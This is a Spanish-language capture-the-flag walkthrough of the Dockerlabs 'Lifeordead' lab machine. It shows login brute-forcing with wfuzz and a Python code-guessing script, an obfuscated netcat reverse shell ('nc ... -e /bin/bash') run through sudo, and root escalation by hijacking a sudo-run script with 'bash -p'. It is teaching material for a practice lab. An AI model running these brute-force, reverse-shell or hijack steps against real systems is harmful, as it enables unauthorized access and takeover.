---
title: Lifeordead - Hard (Dockerlabs)
permalink: /Lifeordead-Dockerlabs-Writeup/
tags:
  - "Linux"
  - "Hard"
  - "Virtual IP Aliasing"
  - "Sudoers"
  - "Script Hijacking"
categories:
  - writeup
  - hacking
  - dockerlabs
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Lifeordead - Hard (Dockerlabs)
seo_description: Practica tus habilidades de fuerza bruta y abuso de privilegios sudoers para vencer Lifeordead.
excerpt: Practica tus habilidades de fuerza bruta y abuso de privilegios sudoers para vencer Lifeordead.
header:
  overlay_image: /assets/images/headers/lifeordead-dockerlabs.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/lifeordead-dockerlabs.jpg
---

![image-center](/assets/images/posts/lifeordead-dockerlabs.png){: .align-center}

**Habilidades:** Login Page Brute Forcing (`wfuzz`), Abusing Sudoers Privileges (Script), Virtual IP Aliasing, Abusing Sudo Privileges (Privileged Script Hijacking) [Privilege Escalation]
{: .notice--primary}

# Introducción

Lifeordead es una máquina de la plataforma Dockerlabs de dificultad `Difícil`. En esta máquina se pondrán a prueba nuestras habilidades de hacking web. Aprenderemos diversos conceptos como fuzzing o fuerza bruta a inicios de sesión. Es una máquina ideal para avanzar dentro de la explotación a servicios web y configuración en entornos de contenedores con Docker.

<br>

# Reconocimiento
---
Primeramente podemos agregar la IP del contenedor al archivo `/etc/hosts` con el siguiente comando

~~~ bash
echo '172.17.0.2 lifeordead.local' >> /etc/hosts

# Le hacemos un ping para ver si la máquina responde
ping lifeordead.local
~~~


## Nmap 

Empezaremos el reconocimiento con un escaneo de puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn lifeordead.local -v -oG openPorts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 22:06 EST
Initiating ARP Ping Scan at 22:06
Scanning lifeordead.local (172.17.0.2) [1 port]
Completed ARP Ping Scan at 22:06, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:06
Scanning lifeordead.local (172.17.0.2) [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 22:06, 1.16s elapsed (65535 total ports)
Nmap scan report for lifeordead.local (172.17.0.2)
Host is up (0.000010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grep`
- `-v`: Mostrar la información en tiempo real

Haremos un segundo escaneo sobre los puertos que encontramos para detectar versiones y servicios

~~~ bash
nmap -sVC -p 22,80 lifeordead.local -oN services

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 22:12 EST
Nmap scan report for lifeordead.local (172.17.0.2)
Host is up (0.000047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:c3:e7:47:85:79:ce:e9:e6:1f:dd:43:37:9b:aa:a5 (ECDSA)
|_  256 4d:80:5f:fa:24:fa:c3:70:fc:bd:39:d8:e7:5b:c7:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
~~~

- `-p`: Especificar los puertos
- `-sV`: Identificar la versión del servicio que se ejecuta
- `-sC`: Uso de scripts de reconocimiento 
- `-oN`: Exportar en formato normal (tal como se ve por consola)


## Whatweb

Para detectar las tecnologías que emplea el servidor web usaremos la herramienta `whatweb`

~~~ bash
whatweb http://lifeordead.local

http://lifeordead.local [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Apache2 Ubuntu Default Page: It works]
~~~

Vemos una página por defecto del servidor `apache`

![image-center](/assets/images/posts/lifeordead-web-analysis.png){: .align-center}

## Fuzzing (Posible)

Dado que estamos frente a la página por defecto de `apache` y no tenemos pistas, intentaremos descubrir directorios dentro de este servicio web

~~~ bash
gobuster dir -u http://lifeordead.local// -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lifeordead.local//
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 281]
~~~

Encontramos una ruta `server-status`, pero como el código de estado nos reporta `403`, no podremos acceder a esta ruta debido a que no estamos autorizados

Explorando el código fuente de esta página vemos lo siguiente

![image-center](/assets/images/posts/lifeordead-web-code.png){: .align-center}

Agregaremos este dominio al archivo `/etc/hosts` de manera que luzca de la siguiente forma

~~~ bash
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others
#

172.17.0.2 lifeordead.local lifeordead.dl
~~~

Además vemos un valor extraño en el código CSS

~~~ css
div.page_header {
    height: 180px;
    width: 100%;

    background-color: #F5F6F7;
    background-color: UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU;
  }
~~~

Lo primero que se me ocurriría hacer es intentar decodificarlo desde `base64` como primera prueba, si no obtenemos resultados, podemos intentar averiguar en internet

~~~ bash
echo 'UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU' | base64 -d;echo

PASSWORDADMINSUPERSECRET
~~~

Parece ser una contraseña, la intentaremos usar más adelante...

Volvamos con el nuevo dominio. Si ahora exploramos `lifeordead.dl`, carga la siguiente página

![image-center](/assets/images/posts/lifeordead-login.png){: .align-center}


# Intrusión
---
## Username Fuzzing - Login Form

Probaremos las credenciales, yo lo haría como el usuario `admin` que es lo más común a probar, pero automatizaremos este proceso con `wfuzz`

~~~ bash
wfuzz -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -d 'username=FUZZ&password=PASSWORDADMINSUPERSECRET' --hl 94 http://lifeordead.dl

Target: http://lifeordead.dl/
Total requests: 8295455

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000002:   302        0 L      0 W        0 Ch        "admin"
~~~

El código de estado en este contexto indicaría que el servidor está haciendo una redirección, o sea, que hemos acertado con el usuario

Una vez iniciada la sesión como el usuario `admin`, se nos redirige a la siguiente página

![image-center](/assets/images/posts/lifeordead-admin-panel.png){: .align-center}

Parece que debemos acertar un código, analicemos como se envía la solicitud al servidor


## Burpsuite Analysis

En la siguiente imagen capturamos la solicitud HTTP en Burpsuite

![image-center](/assets/images/posts/lifeordead-request.png){: .align-center}

Enviamos el código bajo el nombre `code`, vemos que si erramos un intento se nos descuentan

![image-center](/assets/images/posts/lifeordead-code-analysis.png){: .align-center}

Podemos apreciar que desde el lado del servidor, se valida si acertamos el código con un valor `status`. En este caso, nos retorna `failed`, pero cuando acertamos, el valor debería retornar `success`. Este valor lo podemos ver en el código de la página

![image-center](/assets/images/posts/lifeordead-code-analysis-2.png){: .align-center}

Cuando nos quedamos sin intentos, se inicia un `timeout` de 30 segundos

![image-center](/assets/images/posts/lifeordead-timeout.png){: .align-center}


## Análisis de la sesión

Luego de una investigación acerca de las respuestas del servidor frente a diferentes tipos de solicitudes. El servidor no es capaz de validar la cantidad de intentos cuando manipulamos la `cookie` de sesión 


<div class="video-center">
  <video controls>
    <source src="{{ '/assets/images/posts/lifeordead-abusing-session-validation_1.mp4' | relative_url }}" type="video/mp4">
    Tu navegador no soporta la reproducción de videos.
  </video>
</div>


Aprovechando esto, no necesitamos contemplar la `cookie` de `PHPSESSID`, lo que facilitaría intentar fuerza bruta para adivinar el código. Construiremos un script en python que facilite esta tarea

~~~ python
import requests

url = "http://lifeordead.dl/pageadmincodeloginvalidation.php"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "*/*",
    "Content-Type": "multipart/form-data; boundary=---------------------------2893980834370073535710702065",
    "Origin": "http://lifeordead.dl",
    "Referer": "http://lifeordead.dl/pageadmincodelogin.html",
    "Connection": "keep-alive"
}

def generate_payload(code):
    boundary = "---------------------------2893980834370073535710702065"
    return f"""--{boundary}
Content-Disposition: form-data; name="code"

{code}
--{boundary}--"""

def brute_force():
    for code in range(10000):  
        code_str = f"{code:04d}" # Definimos el código de 4 dígitos
        response = requests.post(url, data=generate_payload(code_str), headers=headers)

        try:
            result = response.json()
            if result["status"] == "success":
                print(f"[+] Found code : {code_str}")
                return code_str  # Detener el script si se encuentra el código correcto
        except Exception as e:
            print(e)


if __name__ == "__main__":
	print(f"[*] Starting 'code' brute force...\n")
    brute_force()
~~~

Ejecutaremos nuestro script, deberíamos obtener el código de forma inmediata

~~~ bash
python3 brute_code.py
[*] Starting 'code' brute force...
[+] Found code : 0081
~~~

Si ponemos el código en la página nos redirige a otra página donde vemos que se nos muestra el siguiente código secreto

![image-center](/assets/images/posts/lifeordead-secret-code.png){: .align-center}

Parece un hash MD5, si lo crackeamos en `hashes.com` o `crackstation.net` el texto que nos devuelve es `supersecretpassword`

Al final del código de la página vemos el siguiente comentario `html`

![image-center](/assets/images/posts/lifeordead-dimer-user-hint.png){: .align-center}

Claramente el desarrollador nos ha dejado una pista, `dimer` podría ser algún nombre de usuario o alguna contraseña


## SSH

Luego de algunas pruebas, ingresamos con el usuario `dimer` y con el hash como contraseña (si, el hash y no el texto que está detrás)

~~~ bash
ssh dimer@lifeordead.local
dimer@lifeordead.local\'s password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.10.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dimer@dockerlabs:~$      
~~~



# Escalada de privilegios
---
Para poder hacer `Ctrl + L`, necesitamos cambiar la variable de entorno `TERM`

~~~ bash
export TERM=xterm
~~~

Si leemos el archivo `/etc/passwd` podemos ver que existen los usuarios `bilter` y `purter` además de `dimer` y `root`

~~~ bash
dimer@dockerlabs:~$ cat /etc/passwd | grep sh$

root:x:0:0:root:/root:/bin/bash
dimer:x:1001:1001:dimer,,,:/home/dimer:/bin/bash
bilter:x:1000:1000:bilter,,,:/home/bilter:/bin/bash
purter:x:1002:1002::/home/purter:/bin/bash
~~~


## Sudoers Privileges - `dimer`

Primeramente listaremos los privilegios `sudoers` que tengamos asignados

~~~ bash
dimer@dockerlabs:~$ sudo -l

Matching Defaults entries for dimer on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dimer may run the following commands on dockerlabs:
    (bilter : bilter) NOPASSWD: /opt/life.sh
~~~

Podemos ejecutar el script `/opt/life.sh` como el usuario `bilter`

~~~ bash
dimer@dockerlabs:~$ cat /opt/life.sh
#!/bin/bash

set +m

v1=$((0xCAFEBABE ^ 0xAC1100BA))
v2=$((0xDEADBEEF ^ 0x17B4))

a=$((v1 ^ 0xCAFEBABE))
b=$((v2 ^ 0xDEADBEEF))

c=$(printf "%d.%d.%d.%d" $(( (a >> 24) & 0xFF )) $(( (a >> 16) & 0xFF )) $(( (a >> 8) & 0xFF )) $(( a & 0xFF )))

d=$((b))

e="nc"
f="-e"
g=$c
h=$d

$e $g $h $f /bin/bash &>/dev/null &
~~~ 

Analizando el código, se ejecuta `netcat`, se envía el `stdout` al `/dev/null` y se ejecuta en segundo plano para no percibir la ejecución

~~~ bash
nc $g $h -e /bin/bash
~~~ 

Dado que `nc` recibe una IP y un puerto, podemos interpretar las variables `c` y `b` en una consola. Podemos traer el script a nuestra máquina y quitarle `&>/dev/null &` para ver a qué dirección IP se envía la conexión

> Archivo `life_copy.sh` 

~~~ bash
#!/bin/bash

set +m

v1=$((0xCAFEBABE ^ 0xAC1100BA))
v2=$((0xDEADBEEF ^ 0x17B4))

a=$((v1 ^ 0xCAFEBABE))
b=$((v2 ^ 0xDEADBEEF))

c=$(printf "%d.%d.%d.%d" $(( (a >> 24) & 0xFF )) $(( (a >> 16) & 0xFF )) $(( (a >> 8) & 0xFF )) $(( a & 0xFF )))

d=$((b))

e="nc"
f="-e"
g=$c
h=$d

$e $g $h $f /bin/bash
~~~

Si lo ejecutamos deberíamos ver a quién se envía la conexión
~~~ bash
bash life_copy.sh
(UNKNOWN) [172.17.0.186] 6068 (?) : No route to host
~~~


## IP Aliasing

Agregaremos una IP virtual a la interfaz `docker0` para que el contenedor interprete que `172.17.0.186` somos nosotros además de la IP `172.17.0.1`

~~~ bash
sudo ip addr add 172.17.0.186/16 dev docker0
ip addr | grep docker0                 

4: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
    inet 172.17.0.186/16 scope global secondary docker0
6: veth5af3a2f@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
8: veth90e536c@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
~~~

Vemos que se ha asignado otra IP correctamente, entonces ahora pondremos el puerto que espera la conexión para `172.17.0.186`

~~~ bash
nc -lvnp 6068

listening on [any] 6068 ...
connect to [172.17.0.186] from (UNKNOWN) [172.17.0.2] 47850

whoami
bilter
id
uid=1000(bilter) gid=1000(bilter) groups=1000(bilter),100(users)
~~~


## Tratamiento TTY 

Haremos un tratamiento de la TTY para poder operar de una forma más cómoda

~~~ bash
bilter@dockerlabs:/home/dimer$ export TERM=xterm
bilter@dockerlabs:/home/dimer$ script /dev/null -c bash
Script started, output log file is '/dev/null'.

bilter@dockerlabs:/home/dimer$ ^Z
[1]  + 127548 suspended  nc -lvnp 6068

stty raw -echo;fg          
[1]  + 127548 continued  nc -lvnp 6068
                                      reset xterm
~~~


## Sudoers Privileges - `bilter`

Volveremos a listar los privilegios que tengamos asignados a nivel de `sudoers`, esto debido a que al migrar de usuario, este puede contener otros privilegios

~~~ bash
bilter@dockerlabs:/home/dimer$ sudo -l
Matching Defaults entries for bilter on dockerlabs:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User bilter may run the following commands on dockerlabs:
    (ALL : ALL) NOPASSWD: /usr/local/bin/dead.sh
~~~

Si ejecutamos el script con `sudo`, vemos lo siguiente

~~~ bash
bilter@dockerlabs:~$ sudo /usr/local/bin/dead.sh

161
bilter@dockerlabs:~$ 
~~~

No vemos ninguna salida más que un `161`, podemos ver si es que la máquina abre un puerto o algo por el estilo

~~~ bash
bilter@ec965dc496ab:/home/dimer$ cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 318533 1 00000000c3e787fd 99 0 0 10 0                     
   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 318551 1 00000000780eb350 99 0 0 10 0                     
   2: 020011AC:D2FC BA0011AC:17B4 01 00000000:00000000 00:00000000 00000000  1000        0 322889 3 00000000b11ca119 20 4 25 10 -1                   
   3: 020011AC:0016 010011AC:9620 01 00000000:00000000 02:000A54C5 00000000     0        0 316297 2 00000000b8170a28 20 10 29 10 -1                  
   4: 020011AC:8874 BA0011AC:17B4 01 00000000:00000000 00:00000000 00000000  1000        0 321250 1 000000003b0b4abf 20 0 0 10 -1
~~~

Haremos una conversión de puertos para ver aquellos que estén abiertos, podemos hacerlo de la siguiente forma

~~~ bash
echo "$(cat /proc/net/tcp)" | awk '{print $2}'  | awk '{print $2}' FS=':' | sort -u | while read port; do echo "[+] Puerto $port -> $((0x$port))"; done

[+] Puerto  -> 0
[+] Puerto 0016 -> 22
[+] Puerto 0050 -> 80
[+] Puerto 8874 -> 34932
[+] Puerto D2FC -> 54012
~~~

- Los puertos `34932` y `54012` serían las conexiones por `ssh` y `nc` que tengo establecidas con mi máquina atacante

~~~ bash
local_address
00000000:0016
00000000:0050
020011AC:D2FC
020011AC:0016
020011AC:8874
~~~

**Este comando lee el archivo `/proc/net/tcp` y aplica filtros además de una conversión desde formato hexadecimal a decimal para poder identificar los puertos activos en la máquina, es por eso los puertos que vemos con `nmap` están bajo la dirección `00000000`, que en formato decimal sería `0.0.0.0` (aplicando los puntos para hacer la dirección IP).** Este comando lo podemos hacer tanto para `tcp` como para `udp`. Si listamos los puertos activos por `udp`, vemos lo siguiente

~~~ bash
bilter@ec965dc496ab:/home/dimer$ echo "$(cat /proc/net/udp)" | awk '{print $2}'  | awk '{print $2}' FS=':' | sort -u | while read port; do echo "[+] Puerto $port -> $((0x$port))"; done

[+] Puerto  -> 0
[+] Puerto 00A1 -> 161
~~~ 

Comprobaremos esta información con `nmap` para ver si efectivamente el puerto se encuentra a la escucha

~~~ bash
nmap -sU -p 161 -Pn -n 172.17.0.2

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 12:57 EST
Nmap scan report for 172.17.0.2
Host is up (0.00016s latency).

PORT    STATE SERVICE
161/udp open  snmp
MAC Address: 02:42:AC:11:00:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
~~~

## SNMP

Ahora podemos enumerar el protocolo `snmp` para ver si podemos ver información que nos permita escalar privilegios

~~~ bash
snmpwalk -v2c -c public 172.17.0.2
iso.3.6.1.2.1.1.1.0 = STRING: "Linux 96d2cb0bc57d 6.10.11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.10.11-1parrot1 (2024-10-03) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (67575) 0:11:15.75
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@lifeordead.dl>"
iso.3.6.1.2.1.1.5.0 = STRING: "96d2cb0bc57d"
iso.3.6.1.2.1.1.6.0 = STRING: "This port must be disabled aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw="
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
~~~

Si prestamos atención, vemos un mensaje que nos dice que el puerto debería estar desactivado, junto a lo que parece ser una cadena en `base64`

~~~ bash
iso.3.6.1.2.1.1.6.0 = STRING: "This port must be disabled aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw="
~~~

Para decodificar la cadena, podemos simplemente ejecutar el siguiente comando en nuestra máquina

~~~ bash
echo "aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw=" | base64 -d;echo

imposiblepassworduserfinal
~~~

El único usuario al que nos queda migrar antes de `root` sería `purter`

~~~ bash
su purter
Password: 
purter@ec965dc496ab:/home/dimer$ 
~~~


## Sudoers Privileges - `purter`

Volveremos a ver los privilegios que tengamos a nivel de `sudoers` para ver si podemos ejecutar algún otro recurso

~~~ bash
purter@ec965dc496ab:/home/dimer$ sudo -l
Matching Defaults entries for purter on ec965dc496ab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User purter may run the following commands on ec965dc496ab:
    (ALL : ALL) NOPASSWD: /home/purter/.script.sh
~~~

~~~ bash
purter@ec965dc496ab:/home/dimer$ sudo /home/purter/.script.sh
root
~~~

Intentaremos ver el contenido del script, que parece la salida del comando `whoami`

~~~ bash
purter@ec965dc496ab:/home/dimer$ cat /home/purter/.script.sh
#!/bin/bash

whoami
~~~


## Root time

Como este script está en nuestro directorio personal, podemos intentar reemplazar el script para que ejecute lo que nosotros definamos con un script nuevo

~~~ bash
purter@96d2cb0bc57d:~$ rm .script.sh
purter@96d2cb0bc57d:~$ echo '#!/bin/bash' > .script.sh
purter@96d2cb0bc57d:~$ echo 'bash -p' >> .script.sh
purter@96d2cb0bc57d:~$ chmod +x .script.sh
~~~

Ahora que tenemos un script que ejecuta una `bash` como `root` gracias al parámetro `-p`, podemos lanzar el script con sudo

~~~ bash
purter@96d2cb0bc57d:~$ sudo /home/purter/.script.sh
~~~

